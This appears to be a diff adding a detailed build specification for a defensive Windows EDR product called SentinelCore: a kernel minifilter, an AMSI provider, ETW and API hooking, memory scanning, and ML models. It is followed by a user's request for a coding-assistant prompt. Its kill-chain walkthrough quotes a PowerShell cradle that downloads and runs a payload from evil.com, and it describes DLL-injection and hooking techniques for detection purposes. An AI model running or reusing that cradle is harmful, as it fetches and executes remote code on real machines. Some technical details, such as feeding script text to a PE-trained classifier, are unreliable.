@@ -1,0 +1,131 @@
+Master build prompt (for any AI coding assistant or dev team)
+
+Project overview
+
+You are building SentinelCore — a dual-layer endpoint detection and response (EDR) system for Windows. The project has two main codebases that must work together: a C/C++ native agent and a Python ML pipeline. This document is your complete implementation spec. Follow it in order.
+
+Codebase 1 — The C/C++ sensor engine
+
+Language: C++ (C++17), compiled with MSVC or Clang-CL on Windows. The project builds as a Windows Service + kernel driver pair.
+
+Overall goal: This binary runs with SYSTEM privileges at boot. Its job is to intercept every meaningful security event on the machine — file writes, script execution, process behavior, memory injection — and route those events to the ML engine for judgment. It must do this with a scan latency under 500ms and without visibly degrading system performance. It is the "eyes and hands" of the entire system: it sees threats and carries out kill orders.
+
+Component 1 — Kernel-level filesystem mini-filter driver
+
+What it is: A Windows kernel-mode driver that registers as a filesystem filter. Windows routes every single file I/O operation through the filter stack. Your driver sits at a specific altitude in that stack (altitude ~320000, the "anti-virus" range), which means it can intercept file writes before they complete.
+
+What it does:
+
+When any file is about to be written to disk, your driver fires a pre-create callback. You pause the write. You then calculate the file's hash (use SHA-256 for exact matching and SSDeep for fuzzy structural similarity). Next you extract a fast feature vector from the raw bytes: check for the MZ/PE magic bytes that indicate a Windows executable, parse the PE header to extract import table entries (which DLLs it links to — a huge signal), read the section names (.text, .data, .rsrc, but watch for suspicious names like .pack, .UPX0, .themida), calculate per-section Shannon entropy (high entropy = packed/encrypted = suspicious), and record file size and timestamp metadata. You then pass this feature vector over a named pipe or shared memory ring buffer to the ML process in userland. If the ML engine responds with a BLOCK verdict within your timeout (300ms), you return STATUS_ACCESS_DENIED from the callback — the file is never written. If ML doesn't respond in time (to avoid hanging the machine), you let the write proceed and flag the file for deferred scanning.
+
+How to build it: Use the Windows Driver Kit (WDK). Your project type is a KMDF (Kernel-Mode Driver Framework) minifilter. The key functions to implement are FltRegisterFilter(), FltStartFiltering(), and callback routines for IRP_MJ_CREATE and IRP_MJ_WRITE. Communication with userland uses FltCreateCommunicationPort() which creates a safe, trusted channel between kernel and userland that bypasses normal file I/O (so your scanner doesn't accidentally scan its own communication). Test this in a VM first — kernel bugs BSOD the machine.
+
+Component 2 — AMSI provider registration
+
+What it is: AMSI (Anti-Malware Scan Interface) is a Windows API standard that lets any security product register as a scan provider. When a user runs a PowerShell script, Windows doesn't hand it to PowerShell directly — it first calls every registered AMSI provider and says "here is the fully de-obfuscated, ready-to-run script content. Do you approve?" This is the single most important interception point for fileless malware because by the time AMSI fires, all obfuscation layers have already been stripped by the Windows scripting engine.
+
+What it does: Your engine registers a COM object that implements IAntimalwareProvider. When PowerShell, Office VBA, WScript, or any AMSI-aware host executes a script, Windows calls your Scan() method with the raw plaintext content. You pass it to the ML engine. If it's malicious, you return AMSI_RESULT_DETECTED which causes the host (PowerShell, Word, etc.) to throw a security exception and terminate — the script never runs.
+
+How to build it: Implement IAntimalwareProvider and IAntimalware COM interfaces. Register your COM CLSID in HKLM\SOFTWARE\Microsoft\AMSI\Providers\{your-guid}. The key registration key is HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\IFEO is not what you want — you want the AMSI provider key specifically. Test by running an EICAR test string in an obfuscated PowerShell base64 — your Scan() method should receive the plaintext version.
+
+Component 3 — API hooking and Event Tracing for Windows (ETW)
+
+What it is: After a file is allowed to run, you now need to watch what it actually does. This has two sub-systems working in parallel.
+
+ETW (preferred, safer): Windows has a built-in telemetry infrastructure called ETW. The Microsoft-Windows-Kernel-Process and Microsoft-Windows-Threat-Intelligence ETW providers emit events for every process creation, thread creation, image load, and registry modification. Your engine subscribes to these providers as a consumer using StartTrace() and OpenTrace(). This is read-only (no injection into other processes) and completely stable. You get a stream of structured events with timestamps, PIDs, and event details.
+
+API hooking (for gaps ETW doesn't cover): For APIs that ETW doesn't expose (e.g., NtAllocateVirtualMemory with MEM_COMMIT | PAGE_EXECUTE_READWRITE, which is the signature of shellcode injection), you use userland inline hooking. Your agent injects a thin monitoring DLL into target processes using a legitimate technique (e.g., via AppInit_DLLs or a kernel-assisted approach). The DLL patches the first 5 bytes of target ntdll functions with a JMP to your hook. Your hook logs the call, then calls the original. Implement a trampoline: save the first N bytes of the original function, write your JMP, and the trampoline jumps to original_bytes + (original_function + N).
+
+What to watch: Focus on the high-signal API calls: NtCreateProcess/CreateProcess (process spawning — watch for parent-child anomalies), WriteProcessMemory + CreateRemoteThread (the classic DLL injection pattern), NtAllocateVirtualMemory with RWX flags (shellcode staging), RegSetValueEx on Run keys (persistence), WinInet/WinHTTP network calls (C2 communication), and CryptEncrypt + filesystem enumeration in rapid sequence (ransomware).
+
+All events are structured as a telemetry record: {timestamp, pid, ppid, process_name, api_name, parameters[], event_type} and pushed onto a lock-free ring buffer consumed by the ML engine.
+
+Component 4 — Active memory scanning (RWX page detection)
+
+What it is: Advanced malware uses a technique called process hollowing or reflective DLL injection. It writes shellcode into a legitimate process (like svchost.exe) and executes it from memory — there's no malicious file on disk. To catch this, you periodically scan the memory of all running processes looking for suspicious memory regions.
+
+What it does: Every 30 seconds, your engine iterates through all processes using CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS). For each process, it calls VirtualQueryEx() in a loop to enumerate all memory regions. You flag any region with protection flags PAGE_EXECUTE_READWRITE (RWX) — legitimate code never needs to be simultaneously writable and executable after loading. For flagged regions, you read the memory with ReadProcessMemory() and calculate its entropy. High entropy (above 7.2 out of 8.0) in an RWX region inside a process like explorer.exe or svchost.exe is highly indicative of injected shellcode. You send the extracted bytes to the ML engine for static analysis.
+
+Codebase 2 — The Python ML engine
+
+Language: Python 3.11+, running as a Windows service alongside the C++ agent. Communication is via a named pipe (the C++ agent is the client, Python is the server).
+
+Overall goal: Two separate models handle two different threat timelines. The static model triage files in milliseconds. The behavioral model watches sequences of events over time to catch threats that evade static analysis.
+
+Model A — XGBoost static gatekeeper
+
+Training data: Use the EMBER dataset (Endgame Malware BEnchmark for Research) — it contains ~1 million PE file feature vectors with labels. Alternatively, gather your own by crawling VirusTotal.
+
+Feature engineering: Your feature vector for each file has roughly 2,381 dimensions: 256-byte histogram of raw bytes, 256-byte histogram of the first 512 bytes (header region), 8 general file info features (file size, virtual size, has debug, exports, imports, has relocations, has resources, has signature), 57 header features (target machine, number of sections, compile timestamp, pointer to symbol table, major/minor linker version, code/init/uninit sizes, entry point, image base, section alignment), section features (number of sections, plus per-section: name hash, virtual size, virtual address, raw size, entropy, characteristics), import features (96 named import libraries, 256 named import functions as hashed values), export features, and string-based features (length, path count, URL count, registry count, MZ header count). Normalize all features.
+
+Training: Instantiate xgboost.XGBClassifier with n_estimators=1000, max_depth=8, learning_rate=0.05, subsample=0.8, colsample_bytree=0.8, eval_metric='auc'. Use 80/20 train/test split. Target AUC > 0.99 on the EMBER test set. Export the trained model with model.save_model('xgb_gatekeeper.ubj').
+
+Inference pipeline: The Python server listens on the named pipe. When it receives a feature vector from the C++ agent, it calls model.predict_proba(features)[0][1] which returns a float 0.0–1.0 representing malware probability. If the score is above 0.95, send VERDICT=BLOCK back through the pipe. If between 0.50 and 0.95, send VERDICT=MONITOR (allow execution but flag for behavioral analysis). Below 0.50, send VERDICT=ALLOW.
+
+Model B — LSTM behavioral analyst
+
+Architecture: A two-layer stacked LSTM implemented in PyTorch. Input dimension = 128 (encoded event type + parameters). Hidden size = 256. Two LSTM layers with 0.3 dropout between them. Output is a linear layer projecting to the number of MITRE ATT&CK technique classes (approximately 200+ techniques). Use a sigmoid output (not softmax) because a single behavior sequence can map to multiple techniques simultaneously.
+
+Training data: The MITRE ATT&CK STIX dataset provides labeled attack procedure examples. Combine with open-source red team logs (e.g., Mordor/OTRF Security Datasets). Each training sample is a sequence of up to 256 API/ETW events from a single process tree, labeled with one or more ATT&CK technique IDs.
+
+Event encoding: Map each event type (e.g., PROCESS_CREATE, REG_SET_VALUE, NET_CONNECT, FILE_ENCRYPT, MEM_ALLOC_RWX) to an integer ID. For each event in the sequence, create a vector: [event_type_onehot (64d), process_name_hash (32d), parameter_hash (32d)] = 128d total. Pad sequences shorter than 256 events with zeros. Truncate longer sequences.
+
+Training: Adam optimizer, lr=0.001, batch size 64, 50 epochs, early stopping on validation loss. Save the model with torch.save(model.state_dict(), 'lstm_analyst.pt').
+
+Inference: The behavioral model runs on a separate thread from the static model. It maintains a sliding window of the last 256 events per monitored process tree. Every time a new event arrives from the C++ telemetry bus, it appends to that process's window and runs a forward pass. If any technique score crosses 0.80, it checks a rule table: certain technique combinations trigger automatic kill (e.g., T1059.001 PowerShell + T1105 Ingress Tool Transfer together = almost certainly a dropper — kill immediately). Others trigger an alert for human review.
+
+Phase 3 — Optimization layer
+
+Fuzzy hashing with SSDeep: Before running XGBoost, check the incoming file's SSDeep hash against a local database. SSDeep (also called piecewise linear hashing) divides a file into chunks and hashes each chunk. Two files with similar content (even if slightly modified) produce similar fuzzy hashes you can compare with ssdeep.compare(). Maintain a known_malware_ssdeep.db SQLite database. A match score above 70 out of 100 is a definitive hit — skip XGBoost entirely and go straight to BLOCK. This eliminates the CPU cost of ML inference for known malware family variants.
+
+Thread architecture: The C++ engine runs four independent thread pools. Thread pool 1 (4 threads): mini-filter callbacks — these are latency-critical, must respond within 300ms or the kernel will time out. Thread pool 2 (2 threads): AMSI scan requests — also latency sensitive. Thread pool 3 (8 threads): ETW consumer + API hook event processing — throughput-oriented, can queue. Thread pool 4 (2 threads): periodic memory scanner — runs on a 30-second timer, low priority class. Use CRITICAL_SECTION or std::mutex to protect the shared ring buffers. The ring buffer itself should be a lock-free SPSC (single-producer single-consumer) implementation for the hot path.
+
+The zero-day kill chain — step by step
+
+Here's precisely what happens during a zero-day PDF attack, and which line of code in your system fires at each step:
+
+Step 1 — Download: The PDF hits the filesystem. Your mini-filter driver's PreCreate callback fires. It computes SHA-256 + SSDeep in under 5ms. No SSDeep match. It extracts PE features — but this is a PDF, not an executable, so PE parsing returns minimal features. XGBoost scores it at 30% (low threat, PDF structure looks normal). Verdict: ALLOW. File is written to disk.
+
+Step 2 — Open and exploit: The user opens the PDF. Acrobat Reader loads. Your ETW consumer notes PROCESS_CREATE for AcroRd32.exe from Explorer.exe — normal parent-child. Nothing suspicious yet.
+
+Step 3 — Payload drops a child process: The PDF's zero-day exploit triggers. Acrobat's internal JavaScript engine calls CreateProcess to spawn powershell.exe. Your API hook in AcroRd32.exe fires immediately. It logs event: {PROCESS_CREATE, parent=AcroRd32.exe, child=powershell.exe, cmd_line="-enc [base64]"}. This is pushed to the LSTM's event window for the AcroRd32 process tree.
+
+Step 4 — AMSI intercepts the script: PowerShell begins executing. Before running anything, it calls AMSI. Your AMSI provider's Scan() method receives the fully decoded script: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.exe'). You pass this to XGBoost as a text feature vector. Score: 97%. Verdict: BLOCK. You return AMSI_RESULT_DETECTED. PowerShell throws an exception and aborts.
+
+Step 5 — Simultaneously, LSTM fires independently: While AMSI is processing, the LSTM has been accumulating events. It now has the sequence: [normal PDF open] → [PROCESS_CREATE powershell from acrobat] → [AMSI intercept attempt]. This maps to T1566.001 (Spearphishing Attachment) → T1059.001 (PowerShell execution). Combined score: 99% malicious. The LSTM sends a kill command to the C++ agent.
+
+Step 6 — Resolution: The C++ agent receives the kill command. It calls TerminateProcess() on the PowerShell PID and the parent AcroRd32 process. It calls your mini-filter's FltCreateFileUnicode() to move the original PDF to a quarantine directory with restricted ACLs. It logs a full incident report: timestamp, process tree, all events, model verdicts, and file hashes. The machine is clean. Total elapsed time from step 3 to step 6: under 400ms.
+
+Project structure
+
+
+
+
+
+SentinelCore/├── driver/               # WDK kernel minifilter (C++)│   ├── minifilter.cpp│   ├── comms.cpp         # FltCreateCommunicationPort│   └── SentinelDriver.inf├── agent/                # Userland C++ service│   ├── main.cpp│   ├── amsi_provider.cpp│   ├── etw_consumer.cpp│   ├── api_hooks.cpp│   ├── memory_scanner.cpp│   ├── pipe_client.cpp   # Sends features to Python ML server│   └── thread_pools.cpp├── ml/                   # Python ML engine│   ├── server.py         # Named pipe server, routes to models│   ├── static_model/│   │   ├── train_xgb.py│   │   ├── feature_extractor.py│   │   └── xgb_gatekeeper.ubj│   ├── behavioral_model/│   │   ├── train_lstm.py│   │   ├── event_encoder.py│   │   └── lstm_analyst.pt│   └── threat_intel/│       ├── ssdeep_db.py│       └── known_malware.db└── installer/            # NSIS or WiX installer    └── setup.nsi
+
+Key dependencies
+
+The C++ agent needs: WDK (Windows Driver Kit) for the minifilter, Detours (Microsoft open-source) for API hooking, SSDeep library for fuzzy hashing, and the Windows SDK for AMSI/ETW APIs. The Python ML server needs: xgboost, torch, numpy, lief (for PE parsing — much better than writing your own), ssdeep (Python bindings), and pywin32 for named pipe server.
+
+Build the driver component first in a VM. Build and test the userland agent second. Build the Python ML server third. Wire them together with the named pipe IPC last. Integration test with EICAR strings and known malware samples in an isolated environment only.
+
+
+
+FIrst we need a PROMPT that we can use it to antigravity
+
+the PROMPT should be VERY DETAILED (high emphasis on VERY DETAILED)
+
+
+
+our plan is to make the C engine first  and then well will add Both ML engine and IN THE END we will connect everything
+
+
+
+THE C engine should work properly w/o the Both ML engine first
+
+Once we are done training and testing, we will intergrate so make it Intergrate ready
+
+
+
+WE are gonna use Claude Opus in Antigravity
